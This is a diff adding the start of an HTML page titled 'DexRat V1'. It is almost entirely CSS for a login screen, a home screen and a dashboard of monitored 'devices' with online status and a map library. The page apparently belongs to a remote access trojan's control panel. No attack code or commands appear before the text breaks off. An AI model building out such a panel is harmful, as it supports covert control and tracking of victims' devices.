@@ -1,0 +1,1880 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>DexRat V1</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800;900&family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+:root {
+  --bg: #FFF9E6;
+  --card: #FFFFFF;
+  --ink: #000000;
+  --purple: #C4B5FD; --purple-d: #8B5CF6;
+  --blue: #93C5FD; --blue-d: #3B82F6;
+  --cyan: #7DD3FC; --cyan-d: #0EA5E9;
+  --teal: #5EEAD4; --teal-d: #14B8A6;
+  --green: #86EFAC; --green-d: #22C55E;
+  --lime: #BEF264; --lime-d: #84CC16;
+  --yellow: #FDE047; --yellow-d: #EAB308;
+  --orange: #FBBF24; --orange-d: #F59E0B;
+  --peach: #FDBA74; --peach-d: #FB923C;
+  --red: #FCA5A5; --red-d: #EF4444;
+  --pink: #F9A8D4; --pink-d: #EC4899;
+  --rose: #FDA4AF; --rose-d: #F43F5E;
+  --shadow-sm: 3px 3px 0 var(--ink);
+  --shadow-md: 4px 4px 0 var(--ink);
+  --shadow-lg: 5px 5px 0 var(--ink);
+  --shadow-xl: 6px 6px 0 var(--ink);
+}
+
+html, body {
+  width: 100%; height: 100%; overflow: hidden;
+  font-family: 'Inter', sans-serif;
+  background: var(--bg); color: var(--ink);
+  user-select: none; -webkit-user-select: none;
+  -webkit-font-smoothing: antialiased;
+}
+.view { position: fixed; inset: 0; display: none; flex-direction: column; }
+.view.active { display: flex; }
+
+/* =====================================================
+   LOGIN SCREEN
+   ===================================================== */
+#loginScreen {
+  position: fixed; inset: 0; z-index: 999999999;
+  background: var(--bg);
+  display: flex; align-items: center; justify-content: center;
+  padding: 24px; overflow-y: auto;
+}
+#loginScreen.hidden { display: none !important; }
+.login-bg-deco {
+  position: fixed; inset: 0; pointer-events: none; overflow: hidden; z-index: 0;
+}
+.login-bg-deco > div {
+  position: absolute; border: 3px solid var(--ink); opacity: 0.5;
+}
+.login-deco-1 { width:120px; height:120px; background:linear-gradient(135deg,var(--purple),var(--blue)); top:8%; left:-40px; transform:rotate(-15deg); }
+.login-deco-2 { width:90px; height:90px; background:linear-gradient(135deg,var(--pink),var(--red)); border-radius:50%; top:20%; right:-30px; transform:rotate(20deg); }
+.login-deco-3 { width:140px; height:140px; background:linear-gradient(135deg,var(--yellow),var(--orange)); bottom:10%; left:-50px; transform:rotate(45deg); }
+.login-deco-4 { width:100px; height:100px; background:linear-gradient(135deg,var(--cyan),var(--green)); border-radius:50%; bottom:15%; right:-30px; transform:rotate(-25deg); }
+.login-wrap { position:relative; z-index:1; width:100%; max-width:400px; }
+.login-brand-tag {
+  display:inline-block; padding:10px 22px;
+  background:linear-gradient(135deg,var(--yellow),var(--orange));
+  border:3px solid var(--ink); border-radius:12px;
+  box-shadow:5px 5px 0 var(--ink);
+  font-family:'JetBrains Mono', monospace;
+  font-size:13px; font-weight:900; letter-spacing:2px;
+  text-transform:uppercase; margin-bottom:20px; color:var(--ink);
+}
+.login-card {
+  background:var(--card); border:4px solid var(--ink);
+  border-radius:20px; box-shadow:10px 10px 0 var(--ink);
+  padding:30px 24px 26px;
+}
+.login-icon-wrap { text-align:center; margin-bottom:18px; }
+.login-icon {
+  width:82px; height:82px; margin:0 auto;
+  background:linear-gradient(135deg,var(--cyan),var(--green));
+  border:4px solid var(--ink); border-radius:22px;
+  box-shadow:6px 6px 0 var(--ink);
+  display:flex; align-items:center; justify-content:center;
+  font-size:36px; color:var(--ink);
+}
+.login-title {
+  font-family:'JetBrains Mono', monospace;
+  font-size:22px; font-weight:900; color:var(--ink);
+  text-align:center; letter-spacing:2px;
+  text-transform:uppercase; margin-bottom:6px;
+}
+.login-sub {
+  font-family:'JetBrains Mono', monospace;
+  font-size:10.5px; color:#6b7280; font-weight:700;
+  text-align:center; letter-spacing:1px;
+  text-transform:uppercase; margin-bottom:22px;
+}
+.login-label {
+  display:block; font-family:'JetBrains Mono', monospace;
+  font-size:10px; font-weight:900; color:var(--ink);
+  letter-spacing:1.5px; text-transform:uppercase;
+  margin-bottom:8px;
+}
+.login-input-wrap { position:relative; margin-bottom:16px; }
+.login-input {
+  width:100%; padding:14px 16px;
+  background:var(--bg); border:3px solid var(--ink); border-radius:12px;
+  color:var(--ink); font-family:'JetBrains Mono', monospace;
+  font-size:14px; font-weight:700; outline:none;
+  transition: all 0.15s;
+}
+.login-input.pw { padding-right:44px; letter-spacing:2px; }
+.login-input:focus { background:#fff; box-shadow:var(--shadow-md); transform:translate(-1px,-1px); }
+.login-toggle-pass {
+  position:absolute; right:8px; top:50%; transform:translateY(-50%);
+  width:36px; height:36px;
+  background:transparent; border:none; cursor:pointer;
+  color:#6b7280; font-size:16px;
+  display:flex; align-items:center; justify-content:center;
+}
+.login-toggle-pass:hover { color:var(--ink); }
+.login-msg {
+  display:none; padding:11px 14px; margin-bottom:14px;
+  border:3px solid var(--ink); border-radius:12px;
+  box-shadow:3px 3px 0 var(--ink);
+  font-family:'JetBrains Mono', monospace;
+  font-size:11.5px; font-weight:900; color:var(--ink);
+  text-transform:uppercase; letter-spacing:0.5px;
+  align-items:center; gap:8px;
+}
+.login-msg.error { background:linear-gradient(135deg,var(--red),var(--pink)); }
+.login-msg.success { background:linear-gradient(135deg,var(--green),var(--teal)); }
+.login-btn {
+  width:100%; padding:16px;
+  background:linear-gradient(135deg,var(--cyan),var(--green));
+  border:3px solid var(--ink); border-radius:14px;
+  box-shadow:5px 5px 0 var(--ink);
+  font-family:'JetBrains Mono', monospace;
+  font-size:14px; font-weight:900; color:var(--ink);
+  cursor:pointer; letter-spacing:1.5px;
+  text-transform:uppercase;
+  display:flex; align-items:center; justify-content:center; gap:10px;
+  transition: all 0.1s;
+}
+.login-btn:hover { transform:translate(-2px,-2px); box-shadow:7px 7px 0 var(--ink); }
+.login-btn:active { transform:translate(4px,4px); box-shadow:0 0 0 var(--ink); }
+.login-btn:disabled { opacity:0.6; cursor:not-allowed; transform:translate(4px,4px); box-shadow:0 0 0 var(--ink); }
+.login-hint {
+  margin-top:16px; padding:10px 14px;
+  background:linear-gradient(135deg,var(--yellow),var(--orange));
+  border:3px solid var(--ink); border-radius:12px;
+  box-shadow:3px 3px 0 var(--ink);
+  font-family:'JetBrains Mono', monospace;
+  font-size:10px; color:var(--ink); font-weight:800;
+  text-align:center; line-height:1.6;
+}
+.login-footer {
+  text-align:center; margin-top:18px;
+  font-family:'JetBrains Mono', monospace;
+  font-size:10px; color:#6b7280; font-weight:700;
+  letter-spacing:1px;
+}
+@keyframes loginShake {
+  0%, 100% { transform: translateX(0); }
+  20% { transform: translateX(-10px); }
+  40% { transform: translateX(10px); }
+  60% { transform: translateX(-8px); }
+  80% { transform: translateX(8px); }
+}
+.login-shake { animation: loginShake 0.5s ease-in-out; }
+
+/* =====================================================
+   HOME SCREEN
+   ===================================================== */
+#homeScreen {
+  position: fixed; inset: 0; z-index: 9999999;
+  background: var(--bg);
+  display: none; flex-direction: column;
+  overflow: hidden;
+  transition: opacity 0.35s ease;
+}
+#homeScreen.hidden { display: none !important; }
+
+.home-scroll {
+  flex: 1;
+  overflow-y: auto;
+  padding: 24px 20px;
+  padding-top: max(24px, env(safe-area-inset-top));
+  padding-bottom: 140px;
+  position: relative;
+  z-index: 1;
+}
+.home-scroll::-webkit-scrollbar { width: 6px; }
+.home-scroll::-webkit-scrollbar-thumb { background: var(--ink); border-radius: 4px; }
+
+.home-inner {
+  max-width: 520px; margin: 0 auto; width: 100%;
+  display: flex; flex-direction: column; gap: 20px;
+}
+
+/* TOP BAR */
+.home-topbar {
+  display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  background: var(--card); border: 3px solid var(--ink); border-radius: 14px;
+  padding: 12px 16px; box-shadow: var(--shadow-md);
+}
+.home-topbar-brand { display: flex; align-items: center; gap: 12px; }
+.home-topbar-brand .logo-box {
+  width: 42px; height: 42px;
+  background: linear-gradient(135deg, var(--cyan), var(--green));
+  border: 3px solid var(--ink); border-radius: 10px;
+  box-shadow: var(--shadow-sm);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 18px; color: var(--ink);
+}
+.home-topbar-brand .brand-name {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 14px; font-weight: 900; color: var(--ink); letter-spacing: -0.3px;
+}
+.home-topbar-brand .brand-role {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px; color: #6b7280; font-weight: 700; margin-top: 2px;
+  display: flex; align-items: center; gap: 5px;
+}
+.home-topbar-brand .brand-role i { color: var(--green-d); font-size: 7px; }
+.home-logout-btn {
+  padding: 8px 14px;
+  background: linear-gradient(135deg, var(--red), var(--pink));
+  border: 3px solid var(--ink); border-radius: 10px;
+  box-shadow: var(--shadow-sm);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px; font-weight: 900; color: var(--ink);
+  cursor: pointer; letter-spacing: 0.5px; text-transform: uppercase;
+  display: flex; align-items: center; gap: 6px;
+  transition: all 0.1s;
+}
+.home-logout-btn:active { transform: translate(3px, 3px); box-shadow: 0 0 0 var(--ink); }
+
+/* BANNER */
+.home-banner-card {
+  background: var(--card); border: 4px solid var(--ink); border-radius: 20px;
+  box-shadow: 10px 10px 0 var(--ink); overflow: hidden;
+  padding: 12px;
+}
+.home-banner-frame {
+  border: 3px solid var(--ink); border-radius: 14px;
+  overflow: hidden; background: #000; position: relative;
+  aspect-ratio: 16 / 10;
+}
+.home-banner-frame img {
+  width: 100%; height: 100%; object-fit: cover; display: block;
+}
+.home-banner-overlay {
+  position: absolute; inset: 0;
+  background: linear-gradient(180deg, transparent 40%, rgba(0,0,0,0.55) 100%);
+  pointer-events: none;
+}
+.home-banner-badge {
+  position: absolute; top: 12px;
+  padding: 6px 12px;
+  border: 3px solid var(--ink); border-radius: 10px;
+  box-shadow: var(--shadow-sm);
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 900; color: var(--ink);
+  text-transform: uppercase;
+  display: flex; align-items: center; gap: 6px;
+}
+.home-banner-badge.left {
+  left: 12px;
+  background: linear-gradient(135deg, var(--yellow), var(--orange));
+  font-size: 10px; letter-spacing: 1px;
+}
+.home-banner-badge.right {
+  right: 12px;
+  background: linear-gradient(135deg, var(--green), var(--teal));
+  font-size: 9px; letter-spacing: 0.5px;
+}
+.home-banner-badge.right .live-pulse {
+  width: 7px; height: 7px; background: var(--ink); border-radius: 50%;
+}
+.home-banner-footer-text {
+  position: absolute; bottom: 12px; left: 14px; right: 14px;
+  font-family: 'JetBrains Mono', monospace;
+  color: #fff; text-shadow: 2px 2px 0 #000;
+  font-weight: 900; font-size: 13px; letter-spacing: 1px;
+  text-transform: uppercase;
+  display: flex; align-items: center; gap: 8px;
+}
+
+/* WELCOME */
+.home-welcome { text-align: center; margin-top: 4px; }
+.home-welcome-tag {
+  display: inline-block;
+  background: linear-gradient(135deg, var(--yellow), var(--orange));
+  border: 3px solid var(--ink); border-radius: 12px;
+  box-shadow: 5px 5px 0 var(--ink);
+  padding: 10px 22px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px; font-weight: 900; color: var(--ink);
+  letter-spacing: 2px; text-transform: uppercase;
+  margin-bottom: 14px;
+}
+.home-welcome h1 {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 30px; font-weight: 900; color: var(--ink);
+  letter-spacing: 2px; line-height: 1.1;
+  text-transform: uppercase;
+  margin-bottom: 10px;
+}
+.home-welcome h1 .highlight {
+  background: linear-gradient(135deg, var(--purple), var(--pink));
+  color: var(--ink);
+  padding: 2px 14px;
+  border: 3px solid var(--ink);
+  border-radius: 10px;
+  box-shadow: 4px 4px 0 var(--ink);
+  display: inline-block;
+  margin-top: 6px;
+}
+.home-welcome p {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11.5px; color: #4b5563; font-weight: 700;
+  max-width: 340px; margin: 14px auto 0;
+  line-height: 1.7;
+}
+
+/* ACTIONS */
+.home-actions { display: flex; flex-direction: column; gap: 12px; margin-top: 8px; }
+.home-btn {
+  width: 100%; padding: 18px;
+  border: 3px solid var(--ink); border-radius: 16px;
+  box-shadow: 6px 6px 0 var(--ink);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 14px; font-weight: 900; color: var(--ink);
+  cursor: pointer; letter-spacing: 2px; text-transform: uppercase;
+  display: flex; align-items: center; justify-content: center; gap: 12px;
+  transition: all 0.1s;
+}
+.home-btn.thanks { background: linear-gradient(135deg, var(--yellow), var(--orange)); }
+.home-btn:hover { transform: translate(-2px, -2px); box-shadow: 8px 8px 0 var(--ink); }
+.home-btn:active { transform: translate(4px, 4px); box-shadow: 0 0 0 var(--ink); }
+.home-btn i { font-size: 18px; }
+
+/* =====================================================
+   BOTTOM NAVIGATION
+   ===================================================== */
+.bottom-nav {
+  position: absolute; bottom: 0; left: 0; right: 0; z-index: 20;
+  background: linear-gradient(180deg, rgba(255, 249, 230, 0.95) 0%, var(--bg) 100%);
+  backdrop-filter: blur(20px);
+  -webkit-backdrop-filter: blur(20px);
+  border-top: 3px solid var(--ink);
+  display: flex; align-items: stretch;
+  padding: 12px 16px calc(12px + env(safe-area-inset-bottom));
+  gap: 12px;
+  box-shadow:
+    0 -6px 20px rgba(0, 0, 0, 0.08),
+    0 -2px 0 rgba(0, 0, 0, 0.05);
+}
+
+.bn-glow-line {
+  position: absolute;
+  top: -3px; left: 15%; right: 15%;
+  height: 3px;
+  background: linear-gradient(90deg,
+    transparent 0%,
+    var(--purple) 15%,
+    var(--cyan) 35%,
+    var(--green) 50%,
+    var(--yellow) 65%,
+    var(--orange) 85%,
+    transparent 100%);
+  border-radius: 3px;
+  opacity: 0.8;
+}
+
+.bottom-nav-item {
+  flex: 1;
+  position: relative;
+  padding: 12px 10px 10px;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  gap: 6px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px; font-weight: 900;
+  color: #6b7280; text-transform: uppercase; letter-spacing: 1px;
+  cursor: pointer;
+  background: var(--card);
+  border: 3px solid var(--ink);
+  border-radius: 16px;
+  box-shadow: 3px 3px 0 var(--ink);
+  transition: all 0.25s cubic-bezier(0.2, 0.8, 0.3, 1);
+  overflow: hidden;
+  isolation: isolate;
+}
+
+.bn-icon-wrap {
+  position: relative;
+  width: 44px; height: 44px;
+  display: flex; align-items: center; justify-content: center;
+  border-radius: 12px;
+  background: linear-gradient(135deg, #F1F5F9, #E2E8F0);
+  border: 3px solid var(--ink);
+  box-shadow: 2px 2px 0 var(--ink);
+  transition: all 0.3s cubic-bezier(0.2, 0.8, 0.3, 1);
+  z-index: 2;
+}
+
+.bn-icon-wrap i {
+  font-size: 20px;
+  color: #64748B;
+  transition: all 0.3s cubic-bezier(0.2, 0.8, 0.3, 1);
+  z-index: 2;
+}
+
+.bn-label {
+  font-size: 10px;
+  font-weight: 900;
+  letter-spacing: 1.2px;
+  transition: all 0.25s ease;
+  z-index: 2;
+}
+
+.bn-pulse {
+  position: absolute;
+  inset: -4px;
+  border-radius: 14px;
+  background: radial-gradient(circle,
+    rgba(253, 224, 71, 0.6) 0%,
+    transparent 70%);
+  opacity: 0;
+  transition: opacity 0.4s ease;
+  pointer-events: none;
+}
+
+.bn-active-bar {
+  position: absolute;
+  bottom: 0; left: 50%;
+  transform: translateX(-50%) scaleX(0);
+  width: 40%; height: 4px;
+  background: var(--ink);
+  border-radius: 2px 2px 0 0;
+  transition: transform 0.3s cubic-bezier(0.2, 0.8, 0.3, 1);
+}
+
+.bn-badge {
+  position: absolute;
+  top: -8px; right: -8px;
+  min-width: 22px; height: 22px;
+  padding: 0 6px;
+  background: linear-gradient(135deg, var(--red-d), var(--pink-d));
+  color: #fff;
+  border: 3px solid var(--ink);
+  border-radius: 11px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px; font-weight: 900;
+  display: flex; align-items: center; justify-content: center;
+  box-shadow: 2px 2px 0 var(--ink);
+  z-index: 5;
+}
+
+.bottom-nav-item.active {
+  color: var(--ink);
+  background: linear-gradient(135deg, var(--yellow), var(--orange));
+  transform: translateY(-4px);
+  box-shadow:
+    4px 8px 0 var(--ink),
+    0 0 20px rgba(251, 191, 36, 0.5);
+}
+
+.bottom-nav-item.active .bn-icon-wrap {
+  background: var(--ink);
+  box-shadow: 2px 2px 0 rgba(0,0,0,0.3);
+  transform: rotate(-6deg) scale(1.08);
+}
+
+.bottom-nav-item.active .bn-icon-wrap i {
+  color: var(--yellow);
+}
+
+.bottom-nav-item.active .bn-label {
+  letter-spacing: 1.5px;
+}
+
+.bottom-nav-item.active .bn-pulse {
+  opacity: 1;
+}
+
+.bottom-nav-item.active .bn-active-bar {
+  transform: translateX(-50%) scaleX(1);
+}
+
+@media (hover: hover) {
+  .bottom-nav-item:hover:not(.active) {
+    transform: translateY(-2px);
+    box-shadow: 4px 5px 0 var(--ink);
+    background: #FFF8DC;
+  }
+  .bottom-nav-item:hover:not(.active) .bn-icon-wrap {
+    transform: scale(1.05);
+  }
+}
+
+.bottom-nav-item:active {
+  transform: translateY(-1px) scale(0.97);
+  box-shadow: 2px 3px 0 var(--ink);
+}
+
+/* THANKS MODAL */
+#thanksModal {
+  position: fixed; inset: 0; z-index: 10000000;
+  background: rgba(0,0,0,0.75);
+  backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px);
+  display: none; align-items: center; justify-content: center;
+  padding: 24px;
+}
+#thanksModal.show { display: flex; }
+.thanks-card {
+  background: var(--card); border: 4px solid var(--ink);
+  border-radius: 24px; padding: 28px 24px 22px;
+  max-width: 360px; width: 100%; text-align: center;
+  box-shadow: 10px 10px 0 var(--ink);
+  position: relative;
+}
+.thanks-icon {
+  width: 88px; height: 88px; margin: 0 auto 16px;
+  background: linear-gradient(135deg, var(--pink), var(--purple));
+  border: 4px solid var(--ink); border-radius: 24px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 38px; color: var(--ink); box-shadow: var(--shadow-md);
+}
+.thanks-label {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px; font-weight: 900; color: #6b7280;
+  letter-spacing: 2px; text-transform: uppercase; margin-bottom: 6px;
+}
+.thanks-name {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 26px; font-weight: 900; color: var(--ink);
+  letter-spacing: 2px; text-transform: uppercase;
+  padding: 12px 16px;
+  background: linear-gradient(135deg, var(--cyan), var(--green));
+  border: 3px solid var(--ink); border-radius: 14px;
+  box-shadow: var(--shadow-md);
+  margin-bottom: 14px;
+}
+.thanks-info {
+  background: linear-gradient(135deg, var(--yellow), var(--orange));
+  border: 3px solid var(--ink); border-radius: 12px;
+  padding: 12px 14px; margin-bottom: 16px;
+  box-shadow: var(--shadow-sm);
+  display: flex; align-items: center; gap: 10px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px; color: var(--ink);
+  text-align: left; line-height: 1.5; font-weight: 800;
+}
+.thanks-info i { font-size: 18px; flex-shrink: 0; }
+.thanks-close-btn {
+  width: 100%; padding: 14px;
+  background: linear-gradient(135deg, var(--red), var(--pink));
+  border: 3px solid var(--ink); border-radius: 12px;
+  box-shadow: var(--shadow-md);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px; font-weight: 900; color: var(--ink);
+  cursor: pointer; text-transform: uppercase;
+  letter-spacing: 1.5px;
+  transition: all 0.1s;
+}
+.thanks-close-btn:active { transform: translate(3px, 3px); box-shadow: 0 0 0 var(--ink); }
+
+/* DASHBOARD */
+.dash-header {
+  padding: 16px 18px; padding-top: max(16px, env(safe-area-inset-top));
+  background: var(--card); border-bottom: 3px solid var(--ink);
+  display: flex; align-items: center; justify-content: space-between;
+  gap: 12px; flex-shrink: 0; z-index: 10;
+}
+.dash-header .brand { display: flex; align-items: center; gap: 12px; min-width: 0; flex: 1; }
+.dash-header .brand-icon {
+  width: 46px; height: 46px;
+  background: linear-gradient(135deg, var(--cyan), var(--blue));
+  border: 3px solid var(--ink); border-radius: 12px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 20px; color: var(--ink); box-shadow: var(--shadow-sm); flex-shrink: 0;
+}
+.dash-header .brand-text { display: flex; flex-direction: column; line-height: 1.2; min-width: 0; }
+.dash-header .brand-text .t1 {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 15px; font-weight: 900; color: var(--ink); letter-spacing: -0.3px;
+}
+.dash-header .brand-text .t2 {
+  font-family: 'JetBrains Mono', monospace; font-size: 10.5px;
+  color: #6b7280; margin-top: 3px; font-weight: 700;
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+}
+.dash-header .conn-badge {
+  display: flex; align-items: center; gap: 6px;
+  padding: 8px 12px;
+  background: linear-gradient(135deg, var(--green), var(--teal));
+  border: 3px solid var(--ink); border-radius: 10px;
+  box-shadow: var(--shadow-sm); font-family: 'JetBrains Mono', monospace;
+  font-size: 10px; font-weight: 900; color: var(--ink);
+  text-transform: uppercase; letter-spacing: 0.5px; flex-shrink: 0;
+}
+.dash-header .conn-badge.offline { background: linear-gradient(135deg, var(--red), var(--pink)); }
+.dash-header .conn-badge .cdot {
+  width: 7px; height: 7px; border-radius: 50%;
+  background: var(--ink);
+}
+.dash-stats {
+  padding: 14px 18px;
+  display: grid; grid-template-columns: repeat(3, 1fr);
+  gap: 10px; flex-shrink: 0;
+}
+.dash-stat {
+  background: var(--card); border: 3px solid var(--ink); border-radius: 12px;
+  padding: 12px 8px; text-align: center; box-shadow: var(--shadow-md);
+}
+.dash-stat:nth-child(1) { background: linear-gradient(135deg, var(--blue), var(--cyan)); }
+.dash-stat:nth-child(2) { background: linear-gradient(135deg, var(--green), var(--lime)); }
+.dash-stat:nth-child(3) { background: linear-gradient(135deg, var(--pink), var(--red)); }
+.dash-stat .val {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 22px; font-weight: 900; color: var(--ink); line-height: 1;
+}
+.dash-stat .lbl {
+  font-family: 'JetBrains Mono', monospace; font-size: 9px;
+  color: var(--ink); text-transform: uppercase;
+  letter-spacing: 0.8px; margin-top: 6px; font-weight: 900;
+}
+.dash-content { flex: 1; overflow-y: auto; padding: 8px 18px 100px; }
+.dash-content::-webkit-scrollbar { width: 8px; }
+.dash-content::-webkit-scrollbar-thumb { background: var(--ink); border-radius: 4px; }
+.dash-section-title {
+  display: flex; align-items: center; justify-content: space-between;
+  background: linear-gradient(135deg, var(--yellow), var(--orange));
+  border: 3px solid var(--ink); border-radius: 12px;
+  padding: 10px 14px; margin-bottom: 12px; box-shadow: var(--shadow-md);
+  font-family: 'JetBrains Mono', monospace; font-size: 12px;
+  font-weight: 900; text-transform: uppercase;
+  letter-spacing: 1px; color: var(--ink);
+}
+.dash-section-title .right { display: flex; align-items: center; gap: 6px; font-size: 10px; }
+.dash-section-title .right .live-dot {
+  width: 8px; height: 8px; border-radius: 50%;
+  background: var(--red-d);
+}
+.device-list { display: flex; flex-direction: column; gap: 14px; margin-top: 16px; }
+.device-card {
+  background: var(--card); border: 3px solid var(--ink); border-radius: 16px;
+  padding: 16px; cursor: pointer; position: relative;
+  box-shadow: var(--shadow-lg); transition: all 0.1s ease;
+}
+.device-card:hover { transform: translate(-2px, -2px); box-shadow: 7px 7px 0 var(--ink); }
+.device-card:active { transform: translate(4px, 4px); box-shadow: 0 0 0 var(--ink); }
+.device-card-head { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
+.device-icon-box {
+  width: 48px; height: 48px;
+  background: linear-gradient(135deg, var(--blue), var(--cyan));
+  border: 3px solid var(--ink); border-radius: 12px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 20px; color: var(--ink); box-shadow: var(--shadow-sm); flex-shrink: 0;
+}
+.device-icon-box.you { background: linear-gradient(135deg, var(--purple), var(--pink)); }
+.device-meta-main { flex: 1; min-width: 0; }
+.device-meta-main .name {
+  font-size: 14px; font-weight: 900; color: var(--ink);
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis; letter-spacing: -0.3px;
+}
+.device-meta-main .sub {
+  font-family: 'JetBrains Mono', monospace; font-size: 10.5px;
+  color: #6b7280; margin-top: 3px; font-weight: 700;
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+}
+.device-status-pill {
+  padding: 5px 10px; border: 3px solid var(--ink); border-radius: 8px;
+  box-shadow: var(--shadow-sm); font-family: 'JetBrains Mono', monospace;
+  font-size: 9px; font-weight: 900; text-transform: uppercase;
+  letter-spacing: 0.5px; flex-shrink: 0;
+  display: flex; align-items: center; gap: 5px;
+}
+.device-status-pill.online { background: linear-gradient(135deg, var(--green), var(--teal)); color: var(--ink); }
+.device-status-pill.offline { background: linear-gradient(135deg, var(--red), var(--pink)); color: var(--ink); }
+.device-status-pill .pdot {
+  width: 6px; height: 6px; border-radius: 50%;
+  background: var(--ink);
+}
+.device-card-info { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
+.device-info-item {
+  background: var(--bg); border: 2px solid var(--ink); border-radius: 10px; padding: 8px 12px;
+}
+.device-info-item .lbl {
+  font-family: 'JetBrains Mono', monospace; font-size: 9px; color: var(--ink);
+  text-transform: uppercase; margin-bottom: 3px;
+  display: flex; align-items: center; gap: 5px; font-weight: 900; letter-spacing: 0.5px;
+}
+.device-info-item .val {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11.5px; font-weight: 800; color: var(--ink);
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+}
+.device-card-foot {
+  display: flex; align-items: center; justify-content: space-between;
+  gap: 8px; font-family: 'JetBrains Mono', monospace;
+  font-size: 10.5px; font-weight: 700; color: var(--ink);
+}
+.device-card-foot > span:first-child { display: flex; align-items: center; gap: 5px; }
+.device-card-foot .open-btn {
+  display: flex; align-items: center; gap: 6px; padding: 7px 12px;
+  background: linear-gradient(135deg, var(--cyan), var(--green));
+  border: 3px solid var(--ink); border-radius: 8px; box-shadow: var(--shadow-sm);
+  font-family: 'JetBrains Mono', monospace; font-size: 10px;
+  font-weight: 900; color: var(--ink); text-transform: uppercase; letter-spacing: 0.5px;
+}
+.empty-state { text-align: center; padding: 50px 20px; }
+.empty-state .empty-icon {
+  width: 90px; height: 90px;
+  background: linear-gradient(135deg, var(--purple), var(--pink));
+  border: 3px solid var(--ink); border-radius: 22px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 36px; color: var(--ink); margin: 0 auto 20px; box-shadow: var(--shadow-lg);
+}
+.empty-state .empty-title {
+  font-family: 'JetBrains Mono', monospace; font-size: 15px;
+  font-weight: 900; color: var(--ink); margin-bottom: 8px;
+  text-transform: uppercase; letter-spacing: 0.5px;
+}
+.empty-state .empty-desc {
+  font-size: 12.5px; line-height: 1.6; color: #6b7280;
+  max-width: 280px; margin: 0 auto; font-weight: 600;
+}
+
+/* FABs */
+.refresh-fab {
+  position: fixed; bottom: 20px; right: 20px;
+  width: 58px; height: 58px;
+  background: linear-gradient(135deg, var(--cyan), var(--green));
+  border: 3px solid var(--ink); border-radius: 14px;
+  box-shadow: var(--shadow-lg);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 22px; color: var(--ink); cursor: pointer; z-index: 100;
+  transition: all 0.1s ease;
+}
+.refresh-fab:hover { transform: translate(-2px, -2px); box-shadow: 7px 7px 0 var(--ink); }
+.refresh-fab:active { transform: translate(3px, 3px); box-shadow: 0 0 0 var(--ink); }
+
+/* TOAST */
+.toast {
+  position: fixed; top: 80px; left: 50%;
+  transform: translateX(-50%) translateY(-120px);
+  background: var(--card); border: 3px solid var(--ink); border-radius: 12px;
+  padding: 12px 20px; color: var(--ink);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px; font-weight: 900;
+  z-index: 999999999; opacity: 0;
+  transition: all 0.3s ease; pointer-events: none;
+  max-width: 90%; text-align: center;
+  display: flex; align-items: center; gap: 10px;
+  box-shadow: var(--shadow-lg);
+}
+.toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+.toast i { color: var(--ink); font-size: 16px; }
+.toast.error { background: linear-gradient(135deg, var(--red), var(--pink)); }
+.toast.warning { background: linear-gradient(135deg, var(--yellow), var(--orange)); }
+.toast.success { background: linear-gradient(135deg, var(--green), var(--teal)); }
+
+/* SMOOTH FADE-IN DASHBOARD */
+@keyframes fadeSlideIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+#dashView.active {
+  animation: fadeSlideIn 0.4s cubic-bezier(0.2, 0.8, 0.3, 1);
+}
+
+@media (max-width: 380px) {
+  .dash-stat .val { font-size: 18px; }
+  .device-card { padding: 14px; }
+  .device-icon-box { width: 42px; height: 42px; font-size: 18px; }
+  .device-meta-main .name { font-size: 12.5px; }
+  .home-welcome h1 { font-size: 24px; }
+  .home-welcome h1 .highlight { padding: 2px 10px; }
+  .thanks-name { font-size: 22px; }
+  .bn-icon-wrap { width: 40px; height: 40px; }
+  .bn-icon-wrap i { font-size: 18px; }
+}
+</style>
+</head>
+<body>
+
+<!-- ==================== LOGIN SCREEN ==================== -->
+<div id="loginScreen">
+  <div class="login-bg-deco">
+    <div class="login-deco-1"></div>
+    <div class="login-deco-2"></div>
+    <div class="login-deco-3"></div>
+    <div class="login-deco-4"></div>
+  </div>
+
+  <div class="login-wrap">
